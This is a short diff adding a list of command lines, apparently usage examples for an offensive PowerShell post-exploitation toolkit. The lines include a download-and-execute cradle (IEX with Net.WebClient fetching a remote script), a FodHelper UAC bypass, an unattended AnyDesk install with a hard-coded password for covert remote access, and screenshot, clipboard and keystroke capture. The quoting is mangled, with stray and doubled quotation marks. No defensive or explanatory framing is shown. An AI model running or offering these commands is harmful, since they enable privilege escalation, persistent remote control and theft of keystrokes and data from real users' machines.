@@ -1,0 +1,11 @@
+"C:\Program Files (x86)\AnyDesk\AnyDesk.exe"","
+"C:\Program Files\AnyDesk\AnyDesk.exe"","
+"C:\Users\Administrator\Desktop> Invoke-AnyDeskInstall -InstallPath ""C:\Users\Alex\AppData\Local\AnyDesk"" -Password ""Unattended123!"" "
+"C:\Users\Administrator\Desktop> Invoke-Screenshot -Path ""C:\Windows\Tasks\"""
+"C:\Users\Vlex\Desktop> Invoke-FodHelperBypass -program ""calc.exe"""
+"C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden"
+"C:\Windows\Tasks\AnyDesk.exe"""
+"C:\Windows\Tasks\id.txt"""
+C:\Users\Administrator\Desktop> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/alexdhital/Infiltrax/main/Infiltrax.ps1')
+C:\Users\Administrator\Desktop> Invoke-Clipboard
+C:\Users\Administrator\Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:\Users\Vlex\Desktop\keystrokes.txt
